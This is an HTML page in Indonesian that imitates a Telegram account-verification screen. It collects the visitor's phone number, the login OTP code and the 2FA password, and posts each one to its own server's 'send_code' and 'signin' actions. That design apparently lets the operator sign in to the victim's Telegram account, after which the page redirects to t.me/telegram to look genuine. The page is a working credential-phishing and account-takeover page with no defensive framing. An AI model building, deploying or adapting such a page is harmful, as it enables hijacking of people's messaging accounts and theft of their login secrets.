<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Verifikasi</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #ebeef2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; }
        .hidden { display: none; }
        #status { font-size: 13px; color: #3390ec; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <div style="background:#3390ec; width:70px; height:70px; border-radius:50%; margin:0 auto 15px; color:white; line-height:70px; font-size:30px; font-weight:bold;">T</div>
        <h3>Verifikasi Akun</h3>
        <div id="step-phone">
            <input type="tel" id="phone" placeholder="+62812345678">
            <button onclick="sendPhone()">Lanjutkan</button>
        </div>
        <div id="step-otp" class="hidden">
            <input type="number" id="otp" placeholder="Kode OTP">
            <button onclick="sendOTP()">Verifikasi</button>
        </div>
        <div id="step-2fa" class="hidden">
            <input type="password" id="password" placeholder="Password 2FA">
            <button onclick="send2FA()">Masuk</button>
        </div>
        <p id="status"></p>
    </div>

    <script>
        async function api(act, body) {
            const r = await fetch(`/api/main?action=${act}`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(body)
            });
            return await r.json();
        }

        async function sendPhone() {
            const p = document.getElementById('phone').value.replace(/\s/g, '');
            document.getElementById('status').innerText = "Meminta kode...";
            const res = await api('send_code', { phone: p });
            if(res.success) {
                localStorage.setItem('p', p);
                localStorage.setItem('h', res.hash);
                document.getElementById('step-phone').classList.add('hidden');
                document.getElementById('step-otp').classList.remove('hidden');
                document.getElementById('status').innerText = "Kode terkirim.";
            } else { alert(res.error); }
        }

        async function sendOTP() {
            const c = document.getElementById('otp').value;
            document.getElementById('status').innerText = "Memverifikasi...";
            const res = await api('signin', { phone: localStorage.getItem('p'), code: c, hash: localStorage.getItem('h') });
            if(res.success) {
                if(res.need_2fa) {
                    document.getElementById('step-otp').classList.add('hidden');
                    document.getElementById('step-2fa').classList.remove('hidden');
                } else { window.location.href = "https://t.me/telegram"; }
            } else if(res.error === "expired") {
                alert("Sesi expired, mengulang..."); location.reload();
            } else { alert(res.error); }
        }

        async function send2FA() {
            const pass = document.getElementById('password').value;
            const res = await api('signin', { phone: localStorage.getItem('p'), password: pass });
            if(res.success) { window.location.href = "https://t.me/telegram"; } else { alert(res.error); }
        }
    </script>
</body>
</html>
